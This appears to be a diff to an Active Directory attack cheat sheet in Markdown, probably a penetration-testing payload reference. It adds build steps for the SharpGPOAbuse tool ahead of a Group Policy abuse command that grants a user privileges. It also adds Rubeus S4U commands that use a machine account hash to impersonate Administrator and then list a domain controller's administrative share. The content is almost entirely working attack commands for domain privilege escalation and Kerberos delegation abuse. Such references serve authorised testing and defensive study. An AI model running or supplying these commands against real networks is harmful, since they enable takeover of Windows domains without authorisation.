@@ -407,6 +407,11 @@ Get-NetGPOGroup
 ### Exploit Group Policy Objects GPO
 
 ```powershell
+# Build and configure SharpGPOAbuse
+git clone https://github.com/FSecureLABS/SharpGPOAbuse
+Install-Package CommandLineParser -Version 1.9.3.15
+ILMerge.exe /out:C:\SharpGPOAbuse.exe C:\Release\SharpGPOAbuse.exe C:\Release\CommandLine.dll
+
 # Adding User Rights
 SharpGPOAbuse.exe --AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight" --UserAccount bob.smith --GPOName "Vulnerable GPO"
 
@@ -1250,7 +1255,9 @@ Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
 [*] Saving ticket in Administrator.ccache
 
 # Exploit with Rubeus
-$ rubeus s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:cifs/srv01.domain.com /ptt
+$ ./Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:cifs/srv01.domain.com /ptt
+$ ./Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:"cifs/dc.domain.com" /ptt
+$ dir \\dc.domain.com\c$
 ```
 
 
